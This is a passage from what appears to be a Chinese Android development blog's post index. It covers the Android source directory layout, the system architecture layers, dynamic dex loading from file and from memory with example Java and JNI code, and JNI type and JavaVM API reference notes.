dhcpcd （DHCP服务）|-- dosfstools （DOS文件系统工具）|-- dropbear （SSH2的server）|-- e2fsprogs （EXT2文件系统工具）|-- elfcopy （复制ELF的工具）|-- elfutils （ELF工具）|-- embunit （Embedded Unit Project）|-- emma （java代码覆盖率统计工具）|-- esd （Enlightened Sound Daemon，将多种音频流混合在一个设备上播放）|-- expat （Expat is a stream-oriented XML parser.）|-- fdlibm （FDLIBM (Freely Distributable LIBM)）|-- freetype （字体）|-- fsck_msdos （dos文件系统检查工具）|-- gdata （google的无线数据相关）|-- genext2fs （genext2fs generates an ext2 filesystem as a normal (non-root) user）|-- giflib （gif库）|-- googleclient （google用户库）|-- grub （This is GNU GRUB, the GRand Unified Bootloader.）|-- gtest （Google C++ Testing Framework）|-- icu4c （ICU(International Component for Unicode)在C/C++下的版本）|-- ipsec-tools （This package provides a way to use the native IPsec functionality ）|-- iptables （防火墙）|-- jdiff （generate a report describing the difference between two public Java APIs.）|-- jhead （jpeg头部信息工具）|-- jpeg （jpeg库）|-- junit （JUnit是一个Java语言的单元测试框架）|-- kernel-headers （内核的一些头文件）|-- libffi （libffi is a foreign function interface library.）|-- libpcap （网络数据包捕获函数）|-- libpng （png库）|-- libxml2 （xml解析库）|-- mtpd （一个命令）|-- netcat （simple Unix utility which reads and writes dataacross network connections）|-- netperf （网络性能测量工具）|-- neven （看代码和JNI相关）|-- opencore （多媒体框架）|-- openssl （SSL加密相关）|-- openvpn （VPN开源库）|-- oprofile （OProfile是Linux内核支持的一种性能分析机制。）|-- ping （ping命令）|-- ppp （pppd拨号命令，好像还没有chat）|-- proguard （Java class file shrinker, optimizer, obfuscator, and preverifier）|-- protobuf （a flexible, efficient, automated mechanism for serializing structured data）|-- qemu （arm模拟器）|-- safe-iop （functions for performing safe integer operations ）|-- skia （skia图形引擎）|-- sonivox （sole MIDI solution for Google Android Mobile Phone Platform）|-- speex （Speex编/解码API的使用(libspeex)）|-- sqlite （数据库）|-- srec （Nuance 公司提供的开源连续非特定人语音识别）|-- strace （trace工具）|-- svox （Embedded Text-to-Speech）|-- tagsoup （TagSoup是一个Java开发符合SAX的HTML解析器）|-- tcpdump （抓TCP包的软件）|-- tesseract （Tesseract Open Source OCR Engine.）|-- tinyxml （TinyXml is a simple, small, C++ XML parser）|-- tremor （I stream and file decoder provides an embeddable,integer-only library）|-- webkit （浏览器核心）|-- wpa_supplicant （无线网卡管理）|-- xmlwriter （XML 编辑工具）|-- yaffs2 （yaffs文件系统）`-- zlib （a general purpose data compression library）prebuilt 目录 |-- android-arm （arm-android相关）| |-- gdbserver （gdb调试器）system 目录 |-- Bluetooth （蓝牙相关）|-- core （系统核心工具盒接口）| |-- adb （adb调试工具）| |-- cpio （cpio工具，创建img）| |-- debuggerd （调试工具）| |-- fastboot （快速启动相关）| |-- include （系统接口头文件）| |-- init （init程序源代码）| |-- libacc （轻量级C编译器）| |-- libctest （libc测试相关）| |-- libcutils （libc工具）| |-- liblog （log库）| |-- libmincrypt （加密库）| |-- libnetutils （网络工具库）| |-- libpixelflinger （图形处理库）| |-- libsysutils （系统工具库）| |-- libzipfile （zip库）| |-- logcat （查看log工具）| |-- logwrapper （log封装工具）| |-- mkbootimg （制作启动boot.img的工具盒脚本）| |-- netcfg （网络配置netcfg源码）| |-- nexus （google最新手机的代码）| |-- rootdir （rootfs，包含一些etc下的脚本和配置）| |-- sh （shell代码）| |-- toolbox （toolbox，类似busybox的工具集）| `-- vold （SD卡管理器）|-- extras （额外工具）| |-- latencytop （a tool for software developers ，identifying system latency happen）| |-- libpagemap （pagemap库）| |-- librank （Java Library Ranking System库）| |-- procmem （pagemap相关）| |-- procrank （Java Library Ranking System相关）| |-- showmap （showmap工具）| |-- showslab （showslab工具）| |-- sound （声音相关）| |-- su （su命令源码）| |-- tests （一些测试工具）| `-- timeinfo （时区相关）`-- wlan （无线相关）vendor 目录 |-- aosp （android open source project）| `-- products （一些板级规则）|-- htc （HTC公司）| |-- common-open （通用部分）| | `-- akmd （解压img用的工具）| |-- dream-open （G1开放部分）| |-- prebuilt-open （预编译开放部分）| `-- sapphire-open （sapphire这款型号开放内容）|-- pv-open （没东西）|-- qcom （里面基本是空的）`-- sample （google提供的样例） |-- apps （应用） | |-- client （用户） | `-- upgrade （升级） |-- frameworks （框架） | `-- PlatformLibrary （平台库） |-- products （产品） |-- sdk_addon （sdk添加部分） `-- skins （皮肤） `-- WVGAMedDpi （WVGA适用的图片）# 参考资料 Android 系统源码目录结构详解","categories":[],"tags":[]},{"title":"安卓系统架构概览","slug":"android-system-architecture","date":"2023-10-09T01:53:07.000Z","updated":"2025-04-08T18:55:11.456Z","comments":true,"path":"android-system-architecture/","link":"","permalink":"https://oacia.dev/android-system-architecture/","excerpt":"","text":"这两天和 360 加固抗衡了很久，突然发现自己现在的水平或许还无法搞定 360 加固，晚上睡觉的时候思考了一下，发现原因在于自己对于安卓还没有掌握，甚至连熟悉都算不上。以往学逆向的过程中总流传着一句话：要想逆向做的好，正向必须得精通。我现在连安卓里面有什么都不知道，那还怎么去搞安卓逆向呢？所以这两个月，我要静下心来，好好学习安卓的架构基本组件和基本的机制，把正向的基础打扎实！ 我准备用自底向上的方法来学习安卓系统，从内核开始学起，因为上层的许多模块都是基于下层的，倘若直接从上层开始学起，那肯定会遇到许多下层的模块导致一时之间摸不着头脑. # 安卓系统整体架构 这张图很清晰的描述了安卓的整体架构，从上到下共有五层 Android 是基于 Linux 内核的，从广义的角度说，它可以分为 Linux 内核层和用户空间层 # Linux 内核层 Android 系统是基于 Linux 内核的，这一层为 Android 设备的各种硬件提供了底层的驱动，管理底层驱动程序，用于和设备硬件直接交互，除了 Linux 内核的进程、内存管理等，还包含 Android 添加的特色驱动程序 Binder , Logger 和 Ashmem Android 对于 Linux 进行了改动，比如它没有 glibc ，最初一些便携的移动设备并没有采用 glibc 作为 c 库，而是 google 自己开发的 Bionic Libc 来作为代替品，也并没有完全照搬 Linux 系统的内核还增加了 Gold-Fish 平台以及 yaffs2 Flash 文件系统. 安卓驱动概述如下 Binder IPC 驱动：基于 OpenBinder 框架的一个驱动，用于提供 Android 平台的进程间通信功能。源代码位于 drivers/staging/android/binder.c 。 电源管理 (PM) ：一个基于标准 Linux 电源管理系统的轻量级 Android 电源管理驱动，针对嵌入式设备做了很多优化，比如电池电量。源代码位于： kernel/power/earlysuspend.c、kernel/power/consoleearlysuspend.c、kernel/power/fbearlysuspend.c、kernel/power/wakelock.c、kernel/power/userwakelock.c 低内存管理器：比 Linux 的标准的 OOM 机制更加灵活，它可以根据需要杀死进程以释放需要的内存。源代码位于 drivers/staging/ android/lowmemorykiller.c 。 匿名共享内存： 为进程间提供大块共享内存，同时为内核提供回收和管理这个内存的机制。源代码位于 mm/ashmem.c 。 PMEM ：用于向用户空间提供连续的物理内存区域， DSP 和某些设备只能工作在连续的物理内存上。源代码位于 drivers/misc/pmem.c 。 Logger ：一个轻量级的日志设备，用于抓取 Android 系统的各种日志。源代码位于 drivers/staging/android/logger.c 。 Alarm ：提供了一个定时器，用于把设备从睡眠状态唤醒，同时它还提供了一个即使在设备睡眠时也会 运行的时钟基准。源代码位于 drivers/rtc/alarm.c 。 USB Gadget ：驱动 一个基于标准 Linux USB gadget 驱动框架的设备驱动，Android 的 USB 驱动是基于 gaeget 框架的。源代码位于 drivers/usb/gadget/ 。 Ram Console ： 为了提供调试功能，Android 允许将调试日志信息写入一个被称为 RAM Console 的设备里，它是一个基于 RAM 的 Buffer 。源代码位于 drivers/staging/android/ram_console.c 。 timed device ： 提供了对设备进行定时控制的功能，目前支持 vibrator 和 LED 设备。源代码位于 drivers/staging/android/timed_output.c(timed_gpio.c )。 Yaffs2 ：Android 采用 Yaffs2 作为 MTD nand flash 文件系统，源代码位于 fs/yaffs2/ 目录下。Yaffs2 是一个快速稳定的应用于 NAND 和 NOR Flash 的跨平台的嵌入式设备文件系统，同其他 Flash 文件系统相比，Yaffs2 能使用更小的内存来保存其运行状态，因此它占用内存小。Yaffs2 的垃圾回收非常简单而且快速，因此能表现出更好的性能。Yaffs2 在大容量的 NAND Flash 上的性能表现尤为突出，非常适合大容量的 Flash 存储。 # 用户空间层 # 硬件抽象层 (HAL) 硬件抽象层本应该属于 Linux 内核的驱动的，但是由于部分硬件厂商不想把自己的核心代码公开，如果把代码放在内核空间里就需要遵循 GUN License ，会损害厂家的利益。所以，Google 为了响应厂家，在 Android 的架构里提出 HAL 的概念，把对硬件的支持分为用户空间和内核空间，而 HAL 层就属于这里面的用户空间，该部分代码遵循 Apache License ，所以厂家可以把核心的代码实现在 HAL 层，无需对外开放源代码。 HAL 使用抽象和封装的概念，解决了解决软件和硬件的 “冲突” 的问题，是 Linux 内核与用户空间交互的纽带，他有如下优点 使用 HAL 可以帮助开发人员减少开发时间并提高代码架构质量； HAL 的实现可以作为动态库或模块加载，实现了对硬件的抽象，同时也可以隐藏代码（便捷性 + 安全性）。 # 系统库和运行时库 (Native C/C++ Library&amp;&amp;Android Runtime) 通过一些 c/c++ 库来为 Android 提供主要的特性支持 系统库是应用程序框架的支撑，共有九个 Libc ：系统 c 库，是从 BSD 继承来的标准 C 系统函数库，专门为基于 EmbeddedLinux 的设备定制。 Media Framework （多媒体库）：Android 系统多媒体库，基于 PacketVideoOpen 、 CORE 。该库支持录放。并且可以录制许多流行的音频视频格式。还有静态映像文件，包括 MPEG4、H.264、MP3、AAC、JPG、PNG 等。 Surface Manager ：主要负责管理针对显示系统的访问，并且为多个应用程序提供 2D 和 3D 图层的无缝融合。 Webkit ：浏览器。一个最新的 web 浏览器引擎，用来支持 Android 浏览器和一个可嵌入的 Web 视图。 SGL ：一个内置的 2D 图形引擎。 SSL ：位于 TCP/IP 与各种应用层协议之间为数据通信提供支持。 OpenGL ES ：3D 效果的支持。基于 OpenGLES 1.0 APIs 实现；该库可以使用硬件 3D 加速或者使用高度优化的 3D 软加速。 greeType ：提供位图 bitmap 和向量 vector 的字体描述与显示。 SQLite ：一个对于所有应用程序可用、功能强劲的轻型关系型数据库引擎 除了上面的主要系统类库之外，还有 Android NDK ，即 Android 原生库。 Android 运行时库包含核心库和 Dalvik 虚拟机 核心库：提供了 Java 语言 API 中的大多数功能，同时也包含 Android 的一些核心 API. 如 android.OS 、 android.net 、 android.media 等。 Dalvik 虚拟机：Android 程序不同于 J2ME 程序（是 java 的一种运行环境），每个 Android 应用都运行在自己的进程上，享有 Dalvik 虚拟机为它分配的专有实例，并在该实例中执行。Dalvik 虚拟机可执行文件格式是（ .dex ）。 大多数虚拟机包括 JVM 都是基于栈的，而 Dalvik 虚拟机则是基于寄存器的，所有的类都经由 JAVA 编译器编译，然后通过 SDK 中 的 “dx” 工具转化成.dex 格式由虚拟机执行。在一些底层功能例如线程和低内存管理等方面，Dalvik 虚拟机是依赖 Linux 内核的。 # 应用框架层 (Java API Framework) 应用框架层为开发人员提供了开发应用程序所需要的 API，我们平常开发应用程序都是调用这一层所提供的 API，当然也包括系统应用。这一层是由 Java 代码编写的，可以称为 Java Framework。这一层所提供的主要组件如下 名称 功能描述 Activity Manager（活动管理器） 管理各个应用程序生命周期，以及常用的导航回退功能 Location Manager（位置管理器） 提供地理位置及定位功能服务 Package Manager（包管理器） 管理所有安装在 Android 系统中的应用程序 Notification Manager（通知管理器） 使得应用程序可以在状态栏中显示自定义的提示信息 Resource Manager（资源管理器） 提供应用程序使用的各种非代码资源，如本地化字符串、图片、布局文件、颜色文件等 Telephony Manager（电话管理器） 管理所有的移动设备功能 Window Manager（窗口管理器） 管理所有开启的窗口程序 Content Provider（内容提供者） 使得不同应用程序之间可以共享数据 View System（视图系统） 构建应用程序的基本组件 # 应用层 (System Apps) 系统内置的应用程序以及非系统级的应用程序都属于应用层，负责与用户进行直接交互，通常使用 Java 或 Kotlin 进行开发 # 参考资料 Android 系统架构 —— 导读 了解安卓架构 (linux 内核层、系统运行库层、应用框架层、应用层) 浅谈 HAL（1）- 介绍 Android 系统五层架构","categories":[],"tags":[]},{"title":"Android动态加载dex","slug":"dexloader","date":"2023-09-25T06:01:45.000Z","updated":"2025-04-08T18:55:11.501Z","comments":true,"path":"dexloader/","link":"","permalink":"https://oacia.dev/dexloader/","excerpt":"","text":"在安卓中可以动态加载 dex 来进行类的调用，而对于市面上常见的 dex 加固来说，也同样采取了加密 dex, 并且在解密之后动态调用的方式来进行 dex 的保护，所以我觉得我有必要去学习一下 dex 的动态加载过程，从而对 apk 的加固有更加深刻的了解和体会. # Android studio 生成 dex 既然我们想要让我们的程序动态加载 dex, 那么我们肯定需要先生成一个 dex 才可以咯 首先我们点击 File-&gt;New-&gt;New Module 新建一个 Module 选中此处的 Android Library , 来创建一个 Library 然后把 dex 的核心代码写一下，这个函数的作用是显示一个字符串 随后我们选中 dexlib1 这个 Library , 并点击 Build-&gt;Make Module 'apkprotect.dexlib1' 之后我们便可以在 Dexlib1/.transforms 目录中找到生成的 dex 文件 # Dex 从文件中动态加载 为了让 apk 可以顺利找到我们刚刚生成的 Dex, 我们可以将这个 dex_class.dex 移入到 assets 目录中 随后便可以加载该 dex 并通过反射机制进行函数调用 反射机制是指在运行的状态中，对于任意一个类，都能够调用这个类的所有属性和方法；对于任意一个对象，都能够调用任何方法和属性；像这种动态获取信息以及动态调用对象方法的功能称为 Java 的反射机制。 需要用到 DexClassLoader 函数说明如下 /*DexClassLoader 类参数含义@param dexPath: 待加载的 dex 文件路径，如果是外存路径，一定要加上读外存文件的权限@param optimizedDirectory: 解压后的.dex 文件存储路径，不可为空，此位置一定要是可读写且仅该应用可读写@param librarySearchPath: 指向包含本地库 (so) 的文件夹路径，可以设为 null@param parent: 父级类加载器，一般可以通过 Context.getClassLoader 获取到，也可通过 ClassLoader.getSystemClassLoader () 获取到*/public DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent)具体代码如下 // 将 dex 文件从 assets 目录复制到应用缓存目录AssetManager assetManager = getAssets();InputStream inputStream = assetManager.open(\"dex_class.dex\");File dexfile = new File(getCacheDir(), \"dex_class.dex\");OutputStream outputStream = new FileOutputStream(dexfile);byte[] buffer = new byte[1024];int length;while ((length = inputStream.read(buffer)) > 0) &#123; outputStream.write(buffer, 0, length);&#125;inputStream.close();outputStream.close();// 使用 DexClassLoader 加载 dexDexClassLoader classLoader = new DexClassLoader(dexfile.getAbsolutePath(),getCacheDir().getAbsolutePath(),null,getClassLoader());// 加载插件的类 (插件的包名。类名)Class&lt;?> clazz = classLoader.loadClass(\"com.oacia.dexlib1.dex_class\");// 获取类的实例Object dexlib_obj = clazz.newInstance();// 通过反射获取对应的方法Method method = clazz.getDeclaredMethod(\"say_hello\", Context.class);// 关闭安全检查达到提升反射速度的目的method.setAccessible(true);// 调用反射方法method.invoke(dexlib_obj,MainActivity.this);good! 成功调用方法！ # Dex 从内存中动态加载 事实上，dex 是可以在内存中被动态加载的，而不一定非要使用 dex 文件的方式，这一种加载方式被称为 Dex 不落地加载 通过 InMemoryDexClassLoader 可以实现 dex 在内存的加载 // 加载 dex jobject classLoader = CallObjectMethod(g_context, \"getClassLoader\", \"()Ljava/lang/ClassLoader;\").l; if (g_sdk_int &lt; 26) &#123; ndk_dlclose(art_handle); &#125; else &#123; jclass ElementClass = env->FindClass(\"java/nio/ByteBuffer\"); jobjectArray dexBufferArr = env->NewObjectArray(dexBuffers.size(), ElementClass, NULL); for (int i = 0; i &lt; dexBuffers.size(); i++) &#123; env->SetObjectArrayElement(dexBufferArr, i, dexBuffers[i]); &#125; jclass InMemoryDexClassLoaderClass = env->FindClass(\"dalvik/system/InMemoryDexClassLoader\"); jmethodID InMemoryDexClassLoaderInit = env->GetMethodID(InMemoryDexClassLoaderClass, \"&lt;init>\", \"([Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V\"); jobject InMemoryObj = env->NewObject(InMemoryDexClassLoaderClass, InMemoryDexClassLoaderInit, dexBufferArr, classLoader); jobject pathListObj = GetField(InMemoryObj, \"pathList\", \"Ldalvik/system/DexPathList;\").l; jobjectArray dexElements; if (g_sdk_int >= 29) &#123; jclass list_jcs = env->FindClass(\"java/util/ArrayList\"); jmethodID list_init = env->GetMethodID(list_jcs, \"&lt;init>\", \"()V\"); jobject list_obj = env->NewObject(list_jcs, list_init); dexElements = static_cast&lt;jobjectArray>(CallStaticMethod(\"dalvik/system/DexPathList\", \"makeInMemoryDexElements\", \"([Ljava/nio/ByteBuffer;Ljava/util/List;)[Ldalvik/system/DexPathList$Element;\", dexBufferArr, list_obj).l); &#125; else &#123; dexElements = static_cast&lt;jobjectArray>(GetField(pathListObj, \"dexElements\", \"[Ldalvik/system/DexPathList$Element;\").l); &#125; for (int i = 0; i &lt; env->GetArrayLength(dexElements); i++) &#123; dexobjs.push_back(env->GetObjectArrayElement(dexElements, i)); &#125; env->DeleteLocalRef(ElementClass); env->DeleteLocalRef(InMemoryDexClassLoaderClass); env->DeleteLocalRef(InMemoryObj); env->DeleteLocalRef(pathListObj); &#125;随后将 dex 添加到 DexPathList 中，这样我们就可以利用 FindClass 获取到这一个类了 static void make_dex_elements(JNIEnv *env, jobject classLoader, std::vector&lt;jobject> dexFileobjs)&#123; jclass PathClassLoader = env->GetObjectClass(classLoader); jclass BaseDexClassLoader = env->GetSuperclass(PathClassLoader); // get pathList fieldid jfieldID pathListid = env->GetFieldID(BaseDexClassLoader, \"pathList\", \"Ldalvik/system/DexPathList;\"); jobject pathList = env->GetObjectField(classLoader, pathListid); // get DexPathList Class jclass DexPathListClass = env->GetObjectClass(pathList); // get dexElements fieldid jfieldID dexElementsid = env->GetFieldID(DexPathListClass, \"dexElements\", \"[Ldalvik/system/DexPathList$Element;\"); jobjectArray dexElement = static_cast&lt;jobjectArray>(env->GetObjectField(pathList, dexElementsid)); jint len = env->GetArrayLength(dexElement); LOGD(\"[+]Elements size:%d, dex File size: %d\", len, dexFileobjs.size()); // Get dexElement all values and add add each value to the new array jclass ElementClass = env->FindClass( \"dalvik/system/DexPathList$Element\"); // dalvik/system/DexPathList$Element jobjectArray new_dexElement = env->NewObjectArray(len + dexFileobjs.size(), ElementClass, NULL); for (int i = 0; i &lt; len; i++) &#123; env->SetObjectArrayElement(new_dexElement, i, env->GetObjectArrayElement(dexElement, i)); &#125; if (g_sdk_int &lt; 26) &#123; jmethodID ElementInit = env->GetMethodID(ElementClass, \"&lt;init>\", \"(Ljava/io/File;ZLjava/io/File;Ldalvik/system/DexFile;)V\"); jboolean isDirectory = JNI_FALSE; for (int i = 0; i &lt; dexFileobjs.size(); i++) &#123; jobject element_obj = env->NewObject(ElementClass, ElementInit, NULL, isDirectory, NULL, dexFileobjs[i]); env->SetObjectArrayElement(new_dexElement, len + i, element_obj); &#125; &#125; else &#123; for (int i = 0; i &lt; dexFileobjs.size(); i++) &#123; env->SetObjectArrayElement(new_dexElement, len + i, dexFileobjs[i]); &#125; &#125; env->SetObjectField(pathList, dexElementsid, new_dexElement); env->DeleteLocalRef(ElementClass); env->DeleteLocalRef(dexElement); env->DeleteLocalRef(DexPathListClass); env->DeleteLocalRef(pathList); env->DeleteLocalRef(BaseDexClassLoader); env->DeleteLocalRef(PathClassLoader);&#125;当 dex 被加载到内存中之后，使用下列的语句即可实现相关函数的反射调用 jclass clazz = env->FindClass(\"com/oacia/dexlib1/dex_class\");// 创建类 com/oacia/dexlib1/dex_class 的实例jobject obj = env->AllocObject(clazz);// 获取 Java 方法 \"say_hello\" 的 JNI 引用jmethodID methodID = env->GetMethodID(clazz, \"say_hello\", \"(Landroid/content/Context;)V\");// 调用 Java 方法env->CallVoidMethod(obj, methodID,cnt);点击 LOAD MEMORY DEX , 函数调用成功～ # 参考资料 Android 加壳与脱壳（11）—— 不落地加载壳的对抗研究 https://github.com/Frezrik/Jiagu","categories":[],"tags":[]},{"title":"安卓JNI学习","slug":"android-JNI","date":"2023-09-21T09:25:53.000Z","updated":"2025-04-08T18:55:11.430Z","comments":true,"path":"android-JNI/","link":"","permalink":"https://oacia.dev/android-JNI/","excerpt":"","text":"在日常的安卓逆向中，可能会遇到代码在 libxxx.so 中的情况，而这种在 so 中的代码的编写就涉及到了安卓的 JNI (Java Native Interface) 开发，俗话说要想会逆向，那么首先得要学会正向，假如都没见过某种语法，那还怎么逆向下去嘞？所以就玩玩 JNI 咯～ # 在 Android studio 中开发 JNI 首先我们需要创建一个 jni 文件夹，我们只需要右键 app, 然后点击 New-&gt;Folder-&gt;JNI Folder 就可以创建了 接下来从 Android 布局转到 Project 布局，就可以看到新创建的 jni 文件夹 随后创建一个 oacia.c 和 Android.mk 之后我们需要编写 Android.mk , 关于语法可以参考下面的链接 Android.mk 语法 于是 Android.mk 的内容如下 LOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := oaciaLOCAL_SRC_FILES := oacia.cinclude $(BUILD_SHARED_LIBRARY)#BUILD_SHARED_LIBRARY 生成共享链接库#如果想要生成单独的可执行文件，可以使用 BUILD_EXECUTABLEAndroid.mk 编写完成之后，我们需要将这个配置文件和我们的目标源文件 oacia.c 链接在一起，具体操作如下 右键 app 文件夹，选择 Add C++ to Module 然后选中我们之前编写的 Android.mk 文件即可完成链接 随后我们来到声明 jni 层函数的位置，鼠标悬浮在爆红的函数，点击 Create JNI function for Android studio 便自动为我们完成了函数的定义工作 # 数据类型 # 基本数据类型 Java 类型 JNI 数据类型 位数 boolean jboolean unsigned 8 bits byte jbyte signed 8 bits char jchar unsigned 16 bits short jshort signed 16 bits int jint signed 32 bits long jlong signed 64 bits float jfloat 32 bits double jdouble 64 bits # 引用数据类型 Java 类型 JNI 数据类型 void void java.lang.Object jobject java.lang.Class jclass java.lang.String jstring java.lang.Throwable jthrowable Object[] jobjectArray boolean[] jbooleanArray byte[] jbyteArray char[] jcharArray short[] jshortArray int[] jintArray long[] jlongArray float[] jfloatArray double[] jdoubleArray # jvalue 类型 typedef union jvalue &#123; jboolean z; jbyte b; jchar c; jshort s; jint i; jlong j; jfloat f; jdouble d; jobject l;&#125; jvalue;# 类型描述符 看起来和 smali 的类型声明一模一样 Java 类型 类型描述符 boolean Z short S float F byte B int I double D char C long J void V 引用类型 L + 全限定名 + ; 数组 [+ 类型描述符 方法 (参数的类型描述符) 返回值的类型描述符 表示一个 string 类 L + 全限定名 ，其中 . 换成 / , 最后加上 ; java 类型 类型描述符 java.lang.String Ljava/lang/String; 表示数组 java 类型 类型描述符 String[] [Ljava/lang/String; int[][] [[I 表示方法 java 类型 类型描述符 long f (int n,String s,int arr[]); (ILjava/lang/String;[I) J void f (); () V # 其他常用类型 typedef jint jsize;struct _jfieldID; /* opaque structure */typedef struct _jfieldID* jfieldID; /* field IDs */struct _jmethodID; /* opaque structure */typedef struct _jmethodID* jmethodID; /* method IDs */#define JNI_FALSE 0#define JNI_TRUE 1#define JNI_VERSION_1_1 0x00010001#define JNI_VERSION_1_2 0x00010002#define JNI_VERSION_1_4 0x00010004#define JNI_VERSION_1_6 0x00010006#define JNI_OK (0) /* no error */#define JNI_ERR (-1) /* generic error */#define JNI_EDETACHED (-2) /* thread detached from the VM */#define JNI_EVERSION (-3) /* JNI version error */#define JNI_COMMIT 1 /* copy content, do not free buffer */#define JNI_ABORT 2 /* free buffer w/o copying back */# JavaVM # 定义 javaVM 是 java 虚拟机在 jni 层的代表，在 Android 上， 一个进程只有一个 JavaVM，所有的线程共用一个 JavaVM, 也就是在 Android 进程中是通过有且只有一个虚拟机对象来服务所有 Java 和 C/C++ 代码。 # Invocation API Invocation API 允许软件提供商在原生程序中内嵌 Java 虚拟机。因此可以不需要链接任何 Java 虚拟机代码来提供 Java-enabled 的应用程序。 # DestoryJavaVM 卸载一个 Java 虚拟机，并收回它拥有的资源。 /*@param vm: 需要被销毁的虚拟机。@return: 成功返回 JNI_OK ，失败返回负数。*/jint DestroyJavaVM(JavaVM *vm); JDK/JRE 1.1 还没有完全支持这个函数。在 JDK/JRE 1.1 只有主线程才允许调用该函数。 从 JDK/JRE 1.2 开始，任何线程，不管是否已经 attached，都可以调用该函数，如果当前线程已经 attached，则虚拟机会等待当前线程作为唯一的非守护用户线程。 如果当前线程没有 attached，则先 attached，再等待当前线程作为唯一的非守护用户线程。 JDK/JRE 1.1.2 不支持 unload 虚拟机。 # AttachCurrentThread 附加当前线程到 JavaVM , 并返回 JNIEnv /*@param vm: 需要被 attach 到的虚拟机。@param p_env: 返回的当前线程的 JNI 接口指针。@param thr_args: JavaVMAttachArgs 结构体来指定附加信息，或传入 NULL@return: 成功返回 JNI_OK ，失败返回负数。*/jint AttachCurrentThread(JavaVM *vm, void **p_env, void *thr_args);thr_args thr_args 的结构体如下 typedef struct JavaVMAttachArgs &#123; jint version; /* must be at least JNI_VERSION_1_2 */ char *name; /* the name of the thread as a modified UTF-8 string, or NULL */ jobject group; /* global ref of a ThreadGroup object, or NULL */&#125; JavaVMAttachArgs 尝试 attach 已经 attached 过的线程不会执行任何操作（no-op）。 一个本地线程不能同时 attach 到两个不同的 Java 虚拟机。 当前一个线程 attach 到虚拟机，它的上下文 ClassLoader 是 Bootstrap ClassLoader。 # AttachCurrentThreadAsDaemon 和 AttachCurrentThread 类似，只是新创建的 java.lang.Thread 被设置为守护线程（daemon） /*@param vm: 需要被 attach 到的虚拟机。@param p_env: 返回的当前线程的 JNI 接口指针。@param thr_args: JavaVMAttachArgs 结构体来指定附加信息，或传入 NULL@return: 成功返回 JNI_OK ，失败返回负数。*/jint AttachCurrentThreadAsDaemon(JavaVM* vm, void** p_env, void* args);# DetachCurrentThread 从 java 虚拟机 detach 当前线程。所有这个线程持有的 Java 监视区 (monitor) 都会被释放。 jint DetachCurrentThread(JavaVM *vm); 从 JDK/JRE 1.2 开始，主线程可以从虚拟机 detach。 # GetEnv 获取当前线程的 JNI 接口指针 JNIEnv /*@param vm: 当前的 JavaVM 虚拟机@param env: 存储返回的当前线程的 JNI 接口指针。@param version: JNI 版本。@return: 如果当前线程还没有 attach 到虚拟机，则设置 *env 为 NULL ，并返回 JNI_EDETACHED。 如果指定的 JNI 版本不被支持，则设置 *env 为 NULL ，并且返回 JNI_EVERSION。 否则设置 *env 为正常的接口，并返回 JNI_OK */jint GetEnv(JavaVM *vm, void **env, jint version);# JavaVM 虚拟机加载流程 # 创建虚拟机 JNI_CreateJavaVM() 函数载入和初始化一个 Java 虚拟机。调用该函数的线程被视为是主线程（main thread）。 #inlcude &lt;jni.h>/*@param p_vm: 指向 JavaVM * 的指针，函数成功返回时会给 JavaVM * 指针赋值。@param p_env: 指向 JNIEnv * 的指针，函数成功返回时会给 JNIEnv * 指针赋值。@param vm_args: 指向 JavaVMInitArgs 的指针，是初始化虚拟机的参数。@return: 如果函数执行成功，返回 JNI_OK (值为 0)，如果失败返回负值。*/jint JNI_CreateJavaVM(JavaVM **p_vm, void **p_env, void *vm_args);vm_args 第 3 个参数 vm_args 的结构体为： typedef struct JavaVMInitArgs &#123; jint version; jint nOptions; JavaVMOption *options; jboolean ignoreUnrecognized;&#125; JavaVMInitArgs; version 必须大于等于 JNI_VERSION_1_2 , nOptions 为 options 的数量. options 的结构体为: typedef struct JavaVMOption &#123; char *optionString; /* the option as a string in the default platform encoding */ void *extraInfo;&#125; JavaVMOption; ignoreUnrecognized 设置为 JNI_TRUE ，则会忽视所有不被识别的以 -X 或 _ 开头的参数字符串，如果设置为 JNI_FALSE ，则遇到不被识别的参数时 JNI_CreateJavaVM 函数会返回 JNI_ERR 所有虚拟机的实现都支持它自己的非标准参数。非标准参数必须以 -X 或 _ 开头。例如，JDK/JRE 支持 -Xms 和 -Xmx 参数来允许开发者指定初始化和最大的 heap 大小。 在 JDK/JRE 1.2，不允许在同一个进程创建多个 Java 虚拟机。 使用示例 JavaVMInitArgs vm_args;JavaVMOption options[4];options[0].optionString = \"-Djava.compiler=NONE\"; /* disable JIT */options[1].optionString = \"-Djava.class.path=c:\\myclasses\"; /* user classes */options[2].optionString = \"-Djava.library.path=c:\\mylibs\"; /* set native library path */options[3].optionString = \"-verbose:jni\"; /* print JNI-related messages */vm_args.version = JNI_VERSION_1_2;vm_args.options = options;vm_args.nOptions = 4;vm_args.ignoreUnrecognized = TRUE;/* Note that in the JDK/JRE, there is no longer any need to call * JNI_GetDefaultJavaVMInitArgs. */res = JNI_CreateJavaVM(&amp;vm, (void **)&amp;env, &amp;vm_args);if (res &lt; 0) ...# 线程附加到虚拟机 JNI 接口指针 (JNIEnv) 只在当前线程有效，如果需要在另一个线程访问 Java 虚拟机，必须先调用 AttachCurrentThread() 来将自己 attach 到虚拟机来获得 JNI 接口指针 JNIEnv 线程必须有足够的栈空间来执行一定的工作。每个线程分配多少栈空间根据系统而不同。 # 脱离虚拟机 一个 attach 到虚拟机的本地线程必须在退出前调用 DetachCurrentThread() 来和虚拟机脱离。如果还有 Java 方法在 call stack 中，则这个线程不能被 detach。 # 卸载虚拟机 使用 JNI_DestroyJavaVM() 函数来卸载一个 Java 虚拟机 虚拟机会等待（阻塞），直到当前线程成为唯一的非守护进程的用户进程，才真正执行卸载操作。 用户进程 (user thread) 包括: Java 线程 (java threads) attached 到虚拟机的本地线程 (attached native threads) 为什么要做这样的限制（强制等待），是因为 Java 线程和 native 线程可能会 hold 住系统资源，例如锁，窗口等资源，而虚拟机不能自动释放这些资源。通过限制当前线程是唯一的运行中的用户线程才 unload 虚拟机，则将释放这种系统资源的任务交给程序员自己来负责了。 # 获取 JavaVM 接口 在 Java VM 虚拟机加载动态链接库时，可以在 JNI_OnLoad 的参数中获取到 JavaVM JavaVM *global_jvm;JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) &#123; global_jvm = vm;&#125; 通过 JNIEnv 获取 JavaVM JavaVM *gJavaVM;jobject gJavaObj;JNIEXPORT void JNICALL 